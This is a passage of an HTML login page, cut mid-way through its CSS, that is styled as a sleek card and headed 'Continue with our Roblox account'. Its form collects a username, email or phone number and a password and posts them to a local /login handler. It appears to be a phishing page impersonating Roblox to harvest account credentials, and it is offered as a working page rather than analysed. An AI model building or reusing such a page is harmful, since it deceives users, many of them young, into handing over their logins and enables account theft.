        .container{width:min(420px,94%);background:linear-gradient(180deg,rgba(255,255,255,0.03),rgba(255,255,255,0.02));border-radius:14px;padding:32px;box-shadow:0 8px 32px rgba(2,6,23,0.6),inset 0 1px 0 rgba(255,255,255,0.02);backdrop-filter:blur(8px) saturate(120%);border:1px solid rgba(255,255,255,0.04)}
        .header{display:flex;align-items:center;gap:12px;margin-bottom:18px}
        .logo{width:56px;height:56px;border-radius:12px;background:linear-gradient(135deg,var(--accent),var(--accent2));display:grid;place-items:center;color:white;font-weight:700;box-shadow:0 6px 18px rgba(99,102,241,0.18)}

        .subtitle{font-size:13px;color:rgba(230,238,248,0.75)}
        .form{display:flex;flex-direction:column;gap:12px;margin-top:6px}
        .input{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.04);padding:12px 14px;border-radius:10px;color:inherit;font-size:15px;outline:none;transition:box-shadow .18s,border-color .18s}
        .input:focus{box-shadow:0 4px 24px rgba(7,89,133,0.08);border-color:rgba(124,58,237,0.9)}
        .row{display:flex;align-items:center;justify-content:space-between}
        .btn{margin-top:6px;padding:12px;border-radius:10px;border:0;cursor:pointer;font-weight:600;background:linear-gradient(90deg,var(--accent),var(--accent2));color:white;box-shadow:0 8px 20px rgba(99,102,241,0.18);transition:transform .15s}
        .btn:hover{transform:translateY(-2px)}
        .extras{display:flex;align-items:center;justify-content:space-between;font-size:13px;color:rgba(230,238,248,0.75);margin-top:6px}
        .socials{display:flex;gap:8px;margin-top:14px}
        .social{flex:1;padding:10px;border-radius:10px;background:rgba(255,255,255,0.02);display:flex;align-items:center;justify-content:center;color:rgba(230,238,248,0.9);font-weight:600;cursor:pointer;border:1px solid rgba(255,255,255,0.03)}
        .footer{margin-top:16px;text-align:center;font-size:13px;color:rgba(230,238,248,0.6)}
        .small{font-size:12px;color:rgba(230,238,248,0.6)}
        @media (max-width:420px){.container{padding:20px}}

        .brand{color:rgba(255,255,255,0.9);font-weight:700}

</head>
<body>
    <main class="container" aria-labelledby="loginTitle">
        <h1>Continue with our Roblox account</h1>

        <h6>Please enter your roblox account details</h6>
        <header class="header">
            <div class="logo">RB</div>
            <div>
                <div class="title" id="loginTitle">Welcome</div>
                <div class="subtitle">Sign in to continue to your account</div>
            </div>
        </header>

        <form class="form" action="/login" method="post">
            <input class="input" type="text" name="email" placeholder="Username/Email/Phone" required>
            <input class="input" type="password" name="password" placeholder="Password" required minlength="6">
            <button class="btn" type="submit">Sign in</button>
        </form>
    </main>
</body>
</html>
